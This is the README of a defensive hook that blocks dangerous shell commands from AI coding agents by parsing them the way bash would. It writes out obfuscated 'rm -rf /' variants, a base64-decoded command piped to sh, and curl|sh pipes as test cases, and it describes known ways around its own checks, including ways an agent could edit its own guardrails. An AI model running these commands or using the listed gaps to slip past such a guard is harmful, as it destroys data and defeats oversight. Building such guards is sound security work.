# shguard

A `PreToolUse` hook for AI coding agents that blocks dangerous shell commands
by interpreting what bash will actually execute — real tokenisation and
static normalisation, not regex matching against the command string.

## The regression table

Seven headline cases: one per published GuardFall class, two shguard
extensions, and a false-positive guard. This table is asserted verbatim by
`tests/guardfall.rs` — every row below is a passing test, not a claim.

| # | Class | Command | Expected |
|---|-------|---------|----------|
| 1 | A — quote removal | `r''m -rf /` | **Block** |
| 2 | A-ext — ANSI-C quoting | `$'\x72\x6d' -rf /` | **Block** |
| 3 | B — `$IFS` splitting | `rm$IFS-rf$IFS/` | **Block** |
| 4 | C — command substitution | `$(echo cm0gLXJmIC8= \| base64 -d)` | **Ask** |
| 5 | C-ext — variable indirection | `X=rm; $X -rf /` | **Block** |
| 6 | D — decode-fed pipe | `echo cm0gLXJmIC8= \| base64 -d \| sh` | **Block** |
| 7 | — false-positive guard | `git commit -m 'rm -rf /'` | **Allow** |

Rows 2 and 5 (ANSI-C quoting, variable indirection) are extensions shguard
covers beyond the published GuardFall catalog — see [Attribution](#attribution).

## What it is

shguard is a `PreToolUse` hook for AI coding agents that blocks dangerous
shell commands by interpreting what bash will actually execute — real
tokenisation and static normalisation, not regex matching. It ships as a
single Rust binary with an agent-agnostic decision core, so the same
`analyze()` function can sit behind hook adapters for different coding
agents.

## How it works: a four-stage pipeline

1. **Parse** — a thin adapter over [`brush-parser`](https://crates.io/crates/brush-parser)
   converts the raw command string into shguard's own AST, so the external
   parser crate never leaks past the parser boundary.
2. **Normalise** — static folding on the AST: quote removal (`r''m` → `rm`),
   ANSI-C decoding (`$'\x72\x6d'` → `rm`), `$IFS` splitting, and tilde/brace
   expansion. Only what is statically determinable is folded — no
   environment lookups, no filesystem globbing, no execution.
3. **Danger check** — an exact match of the resolved argv against
   `rules/blocklist.toml`: does the token at this position match exactly.
4. **Structural gate** — routes constructs whose value can't be statically
   resolved by their *structure* rather than by guessing their value:
   command-position substitutions (`$(...)`, bare `$VAR`) go to **Ask**;
   decode-fed interpreter pipes (`base64 -d | sh`) go to **Block**.

## Install

```bash
cargo install shguard
```

Or with Nix:

```bash
nix run github:tsukasaI/shguard
```

### Claude Code registration

Add to `settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "shguard"
          }
        ]
      }
    ]
  }
}
```

## Configuration

By default shguard needs no setup — the embedded blocklist above is all
that runs. To declare your own per-command policy, create
`~/.config/shguard/config.toml` (or set `SHGUARD_CONFIG` to point at a
different file):

```toml
[[ask]]
id = "user-ask-gh"
reason = "confirm every gh invocation before it runs"
command = "gh"

[[deny]]
id = "user-deny-scary-tool"
reason = "never run this"
command = "scary-tool"

[[allow]]
id = "user-allow-rm"
reason = "trust me"
command = "rm"
```

Each entry needs a unique `id` (the audit-trail id surfaced in the
decision reason) and a `reason`, plus one of `command`/`command_prefix` —
optionally narrowed further with `required_flags`/`targets`, the same
matcher shape `rules/blocklist.toml` itself uses (see that file's own
schema comments).

### Declaring pipeline-shape rules

`[[ask]]`/`[[deny]]`/`[[allow]]` each match one simple command. A separate
`[[pipeline]]` array matches the *shape of a whole pipeline* instead — an
earlier stage's command name against `sources`, the final stage's command
name against `sinks` — the same mechanism backing the embedded blocklist's
own `curl | sh`/`wget | sh` installer-pipe protection (`rules/
blocklist.toml`'s `curl-wget-pipe-to-shell` rule; distinct from the
regression table's row 6 decode-fed-pipe case, which is a separate,
hardcoded structural-gate check, not a `[[pipeline]]` rule). Declaring your
own lets you forbid additional pipeline shapes (e.g. a team that also
wants to catch `curl ... | python3`) without a code change:

```toml
[[pipeline]]
id = "user-forbid-curl-python"
reason = "forbid piping a downloaded script into python3"
decision = "block"
sources = ["curl", "wget"]
sinks = ["python3"]
```

`decision` is `"block"` (default) or `"ask"` — there is no `"allow"` value
for a pipeline entry, unlike `command`/`command_prefix` rules. `sources`/
`sinks` are exact command names (no `command_prefix`-style prefix
matching): each pipeline stage is resolved to its own command name the
same way a `command`-matched rule resolves argv[0] — basename, with any
transparent wrapper (`env`, `nohup`, `timeout`, ...) skipped — so
`/bin/sh` or `env sh` as a sink is caught exactly like a bare `sh` would
be. The rule matches when *any* earlier stage's resolved name is in
`sources` and the *final* stage's resolved name is in `sinks`.

User-declared pipeline rules are purely additive. Within the `[[pipeline]]`
mechanism itself, they're checked after every embedded pipeline rule
(`rules/blocklist.toml`'s own `[[pipeline]]` entries), so a user rule can
never shadow a built-in one even if it declares the exact same
`sources`/`sinks` with a weaker `decision`. Against the structural gate's
separate, hardcoded decode-fed-pipe detection (the regression table's row
6), the guarantee comes from a different mechanism, not check order: the
gate folds the *worst* verdict across every check it runs, so a weaker
verdict from a user pipeline rule can never suppress a Block the
decode-fed-pipe detection independently produces for the same command.

### Excepting specific targets

`deny`/`ask` entries can also carry `except_targets`, the opposite of
`targets`: the rule matches unless the target matches one of these shapes.
This expresses "gate this command except for a known-safe destination" —
something `targets` alone (matches *only when* a target is hit) and
`allow` layering (can only downgrade a structural Ask, never a config-level
deny/ask — see [Precedence](#precedence-deny--ask--allow) below) can't do.

```toml
[[ask]]
id = "curl-non-localhost"
reason = "confirm before curl makes an outbound request to a non-localhost target"
command = "curl"
except_targets = [
  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
  { exact = "https://localhost" }, { prefix = "https://localhost:" }, { prefix = "https://localhost/" },
  { exact = "http://127.0.0.1" }, { prefix = "http://127.0.0.1:" }, { prefix = "http://127.0.0.1/" },
  { exact = "https://127.0.0.1" }, { prefix = "https://127.0.0.1:" }, { prefix = "https://127.0.0.1/" },
  { exact = "http://[::1]" }, { prefix = "http://[::1]:" }, { prefix = "http://[::1]/" },
  { exact = "https://[::1]" }, { prefix = "https://[::1]:" }, { prefix = "https://[::1]/" },
]

[[ask]]
id = "rsync-remote-spec"
reason = "confirm before rsync touches a remote host"
command = "rsync"
except_targets = [
  { prefix = "/" },
  { prefix = "./" },
  { prefix = "../" },
  { prefix = "~" },
  { exact = "." },
]
```

The rule fires unless *every* candidate target token matches an
`except_targets` alternative — a mix of a local and a remote `rsync`
argument still asks, since the remote one is never excepted. A token whose
value can't be statically resolved (a `$VAR`, a substitution) is never
treated as excepted either, so a command with an unresolvable argument
still asks rather than silently passing through. A target passed as a
`--flag=value` token's attached value (e.g. `--url=`) is still checked
against `except_targets`, not silently skipped just because the token
itself starts with `-`.

Note the curl example's `{ exact = … }` / `…:`/`…/`-suffixed alternatives,
not a bare `{ prefix = "http://localhost" }`: `targets`/`except_targets`
match on a plain string prefix, with no URL-authority parsing, so an
unanchored prefix would also match `http://localhost.evil.example.com` (a
different host that merely starts with the same characters) or
`http://localhost@evil.example.com` (`localhost` as URL userinfo, not the
host). Anchoring each alternative at a port/path boundary or an exact match
closes both; it's still not a full URL parse (a colon-anchored prefix
still matches userinfo-with-password forms like
`http://localhost:pw@evil.example.com`, and query strings aren't handled
either), so treat this as narrowing the gap, not eliminating it.

`except_targets` also can't see a target glued directly onto a
single-dash flag with no `=` separator — curl's `-xhttp://evil.example.com`
short proxy-flag syntax, for instance. That shape is indistinguishable
from an ordinary combined short-flag cluster (`-sSL`) by shape alone, so
it's never recognised as a candidate at all; `curl http://localhost
-xhttp://evil.example.com` would be wrongly excepted by the config above.
Guard a command that uses this idiom with `required_flags`/a separate
`deny` entry rather than relying on `except_targets` alone.

By default, every non-flag/`--flag=value`-value token in the command's tail
counts as a candidate — including a value-taking flag's own value. That
over-counts for commands like the curl/rsync examples above: `curl -s -o
/dev/null -w "%{http_code}" http://localhost:8787/` asks even though the
real target is localhost, because `/dev/null` (the `-o` output path) and
`%{http_code}` (the `-w` format string) are also treated as unexcepted
candidates. `value_flags` narrows this: declare which flags take a value
(without the leading `-`/`--` — a single letter is a short flag, anything
longer a long-option name) and that value — separated or `--name=value`
attached — is excluded from the candidate set entirely, never checked
against `except_targets` one way or the other:

```toml
[[ask]]
id = "curl-non-localhost"
reason = "confirm before curl makes an outbound request to a non-localhost target"
command = "curl"
value_flags = ["o", "w", "m"]
except_targets = [
  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
]

[[ask]]
id = "rsync-remote-spec"
reason = "confirm before rsync touches a remote host"
command = "rsync"
value_flags = ["exclude"]
except_targets = [
  { prefix = "/" },
  { prefix = "./" },
  { prefix = "../" },
  { prefix = "~" },
  { exact = "." },
]
```

`value_flags` only has an effect alongside a non-empty `except_targets`
and an empty `targets`, OR (issue #146) alongside a non-empty
`required_flags`/`required_tokens` and an empty `targets` — declaring it
anywhere else is a load-time error, since the field would otherwise
silently do nothing. In the `required_flags`/`required_tokens` shape, it
narrows a different floor: whether an unresolvable word in the command's
tail (`$VAR`, `$(...)`) *could plausibly be* one of the rule's required
flags/tokens. Without declaring the flag that precedes it as a
`value_flags` entry, a value-taking flag's own value gets mistaken for a
free token that might be the dangerous flag itself — `git commit -m
"$(cat <<'EOF' ... EOF)"` (a heredoc commit message) would otherwise ask
for confirmation, because the message text looks exactly as unresolvable
as a hidden `--no-verify` would:

```toml
[[command]]
id = "git-commit-no-verify-short"
reason = "git commit -n/--no-verify skips pre-commit and commit-msg hooks"
command = "git"
required_tokens = ["commit"]
required_flags = ["n|--no-verify"]
value_flags = ["m", "message"]
```

Declaring a flag here is a trust decision with the same weight as an
`except_targets` entry itself: only declare a flag whose value can never
itself be, or point at, the thing the rule guards against — misdeclaring
one is as much a bypass as a wrong `except_targets` pattern would be. In
particular, don't declare an *optional*-argument flag (one that may or may
not take a value depending on invocation, e.g. GNU `--color[=WHEN]`) —
when such a flag appears without its value, the *next* token is an
unrelated positional, and `value_flags` would wrongly consume it as if it
were that flag's value. A short flag is only recognised as its own
standalone token (`-o`, never glued into a cluster like `-so`), and
everything after a bare `--` end-of-options terminator is exempt from
`value_flags` matching entirely (it's an ordinary positional by shell
convention from that point on, even if its text happens to match a
declared flag's name).

**Subcommand-dispatched commands need one more caveat.** A flag's arity can
depend on which subcommand it's attached to — git's `-m` takes a value on
`commit`/`merge` but is a boolean flag on `rebase` (`--merge`) and `am`
(`--message-id`). Only declare `value_flags` on a rule that pins a single
subcommand via `required_tokens` (as the example above does with
`["commit"]`); declaring it on a rule with no `required_tokens` at all —
one meant to span every subcommand of a dispatched command — can turn a
real flag into an accidentally-swallowed value on the subcommands where
your declared flag doesn't actually take one.

Per-command policy can be scoped to a subcommand sequence: a multi-word
`command` value matches a leading sequence of positional words, e.g.
`command = "gh repo delete"` asks only before `gh repo delete ...`, while
`gh pr view` (and bare `gh`) fall through to their default `Allow` since no
rule fires for them — no separate `allow` entry needed. Under the hood this
desugars to a single-word `command` plus `required_tokens` (`command =
"gh"`, `required_tokens = ["repo", "delete"]`), so it inherits that
shape's own gap: a resolved flag *value* occupying one of the
subcommand's positional slots can defeat the match the same way it can
defeat a hand-written `required_tokens` rule — see the
`value_flags`/subcommand-arity discussion above.

### Precedence: deny > ask > allow

Evaluation is fixed, regardless of which array a rule came from: a `deny`
match always wins; failing that, an `ask` match always wins over an
`allow` match for the same command. A `deny`/`ask` entry can only ever
*raise* what would otherwise be `Allow` — it can never be silently
overridden by a broader `allow` entry elsewhere in the file. This holds
unconditionally for `[[ask]]`-table entries and for `[[deny]]` entries
using the default `decision = "block"`; a `[[deny]]` entry with
`decision = "ask"` instead produces a structural `Ask` — the same kind an
embedded ask-decision blocklist rule would — which a narrower `[[allow]]`
entry in the same config **can** downgrade. An `allow` entry can only ever
*downgrade* an `Ask` that shguard's own structural analysis or an
ask-decision rule produced (an unresolvable construct, or a `[[deny]]`
entry with `decision = "ask"`, for instance) — it can **never** downgrade a
`Block`, from the embedded blocklist or from your own `deny` entries. This
mirrors Claude Code's own `permissions.{deny,ask,allow}` model.

### Escalation floor

Any command wrapped by `sudo`, `doas`, `su`, `pkexec`, or `run0` — anywhere
in its transparent-wrapper chain, not just as the first word (`env sudo ls`
is caught the same as `sudo ls`) — is gated even on a blocklist miss:
`sudo whoami` asks for confirmation by default, while `sudo rm -rf /` still
blocks via the ordinary `rm` rule exactly as before. Set the top-level
`escalation_floor` key to raise that default:

```toml
escalation_floor = "deny"  # default is "ask"; "allow" is rejected at load
```

`"allow"` is rejected when the config is loaded — there is no way to turn
the floor off entirely, only to tighten it. A `[[deny]]`/`[[ask]]` entry
naming one of the five commands directly (`command = "doas"`) is also
reachable, independent of `escalation_floor`, the same as any other rule.

### Discovery

`SHGUARD_CONFIG` (an explicit path) > `$XDG_CONFIG_HOME/shguard/config.toml`
> `$HOME/.config/shguard/config.toml`. There is no project-local
`.shguard.toml` auto-discovery: shguard's own threat model includes "the
agent it's guarding might be adversarially prompted to defeat it," and a
project-local config file would sit inside the same repository the agent
already has Bash/Write/Edit access to — a user-global path is a
meaningfully higher-friction target to tamper with.

If `SHGUARD_CONFIG` is set but the file it names can't be read or fails to
parse/validate, shguard fails closed — every command asks for human
confirmation until the config is fixed, rather than silently falling back
to the embedded blocklist alone. A default path that simply doesn't exist
is not an error: that's the ordinary zero-config case.

### Protecting the config file itself

shguard automatically denies `tee`/`cp`/`mv`/`install`/`sed -i`
(or `--in-place`)/`dd of=`/`rm`/`unlink`/`ln`/`rsync` writes targeting its own
resolved config path, and the literal `~/.config/shguard/` token for any
user — an agent shouldn't be able to edit its own guardrails via a shell
command. This is a partial mitigation, not a complete one:

- A redirection target that is itself a `$()`/backtick substitution has its
  *inner command* checked (issue #51) — but the target *path* it resolves to
  is not checked against this list at all (see Limitations below), so
  `cat > path <<EOF` still is not caught this way, and a `SHGUARD_CONFIG`
  override set via a shell profile is outside shguard's visibility entirely.
- A relative path after `cd`-ing into the config directory (`cd
  ~/.config/shguard && cp evil.toml config.toml`) is not caught — shguard
  never resolves argv tokens against the process's working directory.
- Other write-capable tools (`truncate`, `shred`, …) are not
  enumerated in this list at all.
- `cp`/`install`/`tee`/`dd`/`sed` match a file *under* the config
  directory, but not the bare directory path with no trailing slash
  (`rm`/`unlink`/`ln`/`mv` do cover this).
- Deleting or moving a *parent* of the config directory (e.g. `rm -rf
  ~/.config`) is not caught — self-protection rules only match
  `~/.config/shguard` and paths under it, not any of its ancestors.

### What's not configurable (yet)

`command_prefix` does not support the multi-word `command` sugar
described above; whitespace in a `command_prefix` value is a load-time
error. Pipeline-shape rules (the `curl | sh` pattern and friends) are
also not user-configurable.

## Limitations

shguard mitigates the published GuardFall bypass classes plus the listed
extensions, with the regression suite above as evidence — it does not
eradicate shell-mediated destruction. Explicitly out of scope:

1. **Runtime state.** Environment variables, aliases, shell functions, and
   `PATH` shadowing set by *earlier* commands in a persistent session are
   invisible to shguard — it analyzes one command string at a time, with
   no session memory. See [the threat model's session-state
   assumption](docs/threat-model.md#session-state-is-invisible-to-shguard)
   for the reasoning.
2. **Semantic destructiveness of arbitrary programs.** A Python script that
   deletes files, or `make clean` with a hostile Makefile — shguard's
   blocklist covers enumerated argv shapes (including a curated set of
   dangerous `git` subcommand/flag combinations, e.g. `push --force`,
   `reset --hard`, `commit --amend`), not arbitrary program behavior.
3. **Non-shell destructive edits.** An agent instructed to edit or delete
   files destructively through its file-editing tools rather than through a
   shell command never reaches this hook — see [the threat model's
   non-shell-attack-paths
   scope](docs/threat-model.md#non-shell-attack-paths-are-out-of-scope).
4. **Multi-step attacks staged across Ask-approved commands.** Ask surfaces
   an unresolvable command to a human for a decision; a hurried human can
   still approve a staged payload one step at a time.
5. **Redirection target paths, mostly.** Output/append redirection (`>`,
   `>>`) targets are checked against a curated dangerous-path list (raw
   block devices, `/etc/passwd`, `/etc/shadow`) — but that list doesn't
   include shguard's own config path, so `cat > file <<EOF` is still Allow
   when `file` is shguard's config file. The
   [config-file self-protection](#protecting-the-config-file-itself) rules
   only see write-capable *commands* (`tee`, `cp`, `dd`, …) in argv, not
   bare redirection. A `$()`/backtick substitution sitting in a redirection
   target, or in an unquoted-delimiter heredoc body, IS recursively checked
   (issue #51) — `echo hi > $(curl ... | sh)` and a heredoc body's
   `$(rm -rf /)` are both denied — but only the substitution's *inner
   command*, never the resolved target *path* itself, which stays the
   unchecked case above.
6. **Function definitions are evaluated, not tracked by name.** A `name() {
   ...; }` definition (issue #75) has its body evaluated eagerly and folded
   into the definition's own decision — a dangerous body denies the line
   whether or not it's ever called — but shguard does not track the
   function's name to inline it at a *later* call site, including one on a
   different command line in the same persistent session (the same
   runtime-state limitation as item 1, just reached through a function name
   instead of a variable). A pipeline stage that is a compound command or
   function definition contributes no argv at all to rule 5's shape checks
   (`curl|sh`-style matching, and the decode-stage/interpreter-sink scan) —
   a compound stage has no single "argv" the way a simple command does, and
   an earlier version of this fix that fed through its own worst-wins
   fold-winner argv let the decision hinge on which benign statement
   happened to sort first inside the braces (`curl evil | { true; python3;
   }` vs. `{ python3; true; }`), found during this feature's own two-pass
   code review. When such a stage is the pipeline's *final* one, the line
   additionally floors to at least Ask unconditionally, since rule 5's
   interpreter-sink check has no argv left to inspect there at all.
7. **Ask reaching a human depends on how the host CLI is invoked, not
   just on shguard's decision.** Headlessly (`-p`), Ask never reaches a
   human and fails closed instead, in every mode that dispatches Bash
   headlessly (`plan` never does); interactively it does reach a human in
   every mode, including `bypassPermissions`, with one asymmetry in how
   `dontAsk` handles a `settings.json`-driven ask versus a hook-driven
   one. Measured against Claude Code 2.1.226 —
   see the [permission-mode × decision
   matrix](docs/threat-model.md#empirical-backing-permission-mode--decision-matrix-issue-91)
   (issue #91) for the full headless/interactive tables and methodology.

## Attribution

- The GuardFall bypass catalog (classes A–E) is from Adversa AI's research,
  ["Open-source AI coding agents shell injection vulnerability"](https://adversa.ai/blog/opensource-ai-coding-agents-shell-injection-vulnerability/).
- The tokenise-then-match design — parsing the command the way the shell
  will, instead of pattern-matching the raw string — follows the approach
  used by [Continue](https://continue.dev), the one agent in Adversa's
  survey that held against the full catalog.
- ANSI-C quoting (case 2) and variable indirection (case 5) are shguard
  extensions beyond the published GuardFall catalog, not part of Adversa's
  original classes.

## License

Licensed under either of [Apache License, Version 2.0](LICENSE-APACHE) or
[MIT license](LICENSE-MIT) at your option.
